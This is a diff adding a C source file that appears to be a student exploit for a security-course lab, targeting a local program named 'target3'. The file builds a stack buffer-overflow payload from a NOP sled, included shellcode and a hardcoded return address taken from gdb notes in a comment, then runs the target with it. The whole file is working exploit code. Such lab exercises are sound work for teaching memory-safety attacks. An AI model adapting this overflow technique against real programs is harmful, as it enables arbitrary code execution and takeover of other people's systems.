@@ -1,0 +1,65 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "shellcode-64.h"
+
+#define TARGET "../targets/target3"
+
+int
+main ( int argc, char * argv[] )
+{
+	char *	args[3];
+	char *	env[1];
+
+	/*
+	gdb:
+	BAR:
+		rip = 0x2021fdf8
+		targ = 0x2021fe10 "AAAA", ltarg=88
+	FOO:
+		rip 0x2021fe58
+		&targ 0x2021fe10
+	*/
+
+	args[0] = TARGET;
+	args[2] = NULL;
+	env[0] = NULL;
+
+	int inj_size = 73;
+int i;
+	// Injection string
+	char injection[inj_size];
+	memset(injection, '\x00', inj_size);
+
+	// Put NOPs to the first 8B of injection
+/*	
+
+	for (i = 0; i < 8; i++){
+	  injection[i] = '\x90';
+	}
+*/	
+	memset(injection, '\x90', 8);
+
+	// Concatenate shellcode to inj string
+	strcat(injection, shellcode);
+	// Extra padding to align
+	strcat(injection, "\x90\x90\x90");
+/*
+	// NOPs again until byte 68
+	for (i = 56; i < 68; i++){
+	  injection[i] = '\x90';
+	}
+*/
+	memset(&injection[56], '\x90', 12);
+	
+	strcpy(&injection[68], "\x10\xfe\x21\x20\x00");
+
+	// Pack injection string into args[1]
+	args[1] = injection;
+	
+	if ( execve (TARGET, args, env) < 0 )
+		fprintf (stderr, "execve failed.\n");
+
+	return (0);
+}
